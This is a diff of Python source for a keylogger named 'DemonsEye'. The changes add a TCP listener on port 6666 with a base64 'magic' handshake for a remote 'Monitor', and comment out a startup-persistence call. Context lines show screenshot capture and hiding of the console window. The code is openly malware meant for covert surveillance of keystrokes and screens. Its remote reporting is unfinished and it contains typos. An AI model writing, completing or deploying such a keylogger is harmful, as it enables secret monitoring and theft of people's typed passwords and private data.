@@ -74,13 +74,19 @@ import wx
 # CONSTANTES - CONSTANTS
 ########################################################
 APPNAME = "DemonsEye"           # Just a name
-VERSIONS = "1.0"                # Version
+VERSION = "1.0"                 # Version
 LOGGING_LEVEL = logging.DEBUG   # Log Level Debug. Can be -> DEBUG, INFO, WARNING, ERROR, CRITICAL
 CRLF = '\n'                     # salto de linea - line feed
 KLGPRE = 'klg_'                 # prefijo nombre ficheros de log - prefix name for log files
 KLGEXT = '.dek'                 # extension nombre ficheros keylogger - extension file name for keylogger
 KEYCODE_EXIT = 7                # CTRL + G > combinación especial para cerrar keylogger - key to close keylogger
 
+# Server constants
+SERVER_IP = ''
+SERVER_PORT = 6666
+SERVER_BUFFER_SIZE = 64
+MAGIC_MESSAGE = '4ScauMiJcywpjAO/OfC2xLGsha45KoX5AhKR7O6T+Iw='
+MAGIC_RESPONSE_PLAIN = "Demon's Eye Keylogger "+VERSION
 
 ########################################################
 # VARIABLES GLOBALES - GLOBAL VARIABLES
@@ -126,7 +132,7 @@ class ScreenShootThread (threading.Thread):
         threading.Thread.__init__(self)
         self.screen_file = screen_filename
 
-   def run(self):
+    def run(self):
         logging.info("Guardado captura " + self.screen_file)
         app = wx.App()  # Need to create an App instance before doing anything
         screen = wx.ScreenDC()
@@ -140,17 +146,11 @@ class ScreenShootThread (threading.Thread):
         loggin.info("Fin captura " + self.screen_file)
         # Send screenshot to remote servers
         # ... pending ...
-
+        pass
 
 # Clase multihilo que pone un servidor a la escucha para recibir peticiones del Monitor y
 # crea un cliente para la respuesta
 # Threading class to listen Monitor petitions and create clients for response
-
-# Server constants
-SERVER_IP = ''
-SERVER_PORT = 6666
-SERVER_BUFFER_SIZE = 64
-MAGIC_MESSAGE = 'REVNT05TIEVZRSBLRVlMT0dHRVI='
 
 class ClientThread(threading.Thread):
     def __init__(self, conn, ip, port):
@@ -158,25 +158,29 @@ class ClientThread(threading.Thread):
         self.conn = conn
         self.ip = ip
         self.port = port
+        self.response = base64.b64encode(MAGIC_RESPONSE_PLAIN)
         logging.info("Recibida petición de Monitor desde " + ip + ":" + str(port))
 
     def run(self):
         while True:
             data = self.conn.recv(2048)
-            logging.info("El monitor ha enviado:", data)
+            logging.debug("El monitor ha enviado:", data)
             if data == MAGIC_MESSAGE:
                 message = "Conexion establecida"
-                self.conn.send(message)
+                self.conn.send(MAGIC_RESPONSE_PLAIN)
+                logging.debug(message)
                 # Inicia comunicación inversa para enviar datos al Monitor
                 # Starts reverse comunication to send data to Monitor
                 # ... pending ...
+                pass
             else:
                 message = "No tiene permiso"
                 self.conn.send(message)
+                logging.debug(message)
                 break
 
 
-class ServerListenerThread (threading.Thread):
+class ServerListenerThread(threading.Thread):
     def __init__(self):
         threading.Thread.__init__(self)
         self.name = APPNAME
@@ -536,7 +540,7 @@ parse_params()
 
 # Se asegura de que el kelogger se inicia en cada arranque del sistema
 # Ensures that keylogger starts at system startup
-add_keylogger_to_startup()
+# add_keylogger_to_startup()
 
 # Oculta ventana de aplicación - Hide console Window
 hide_console()
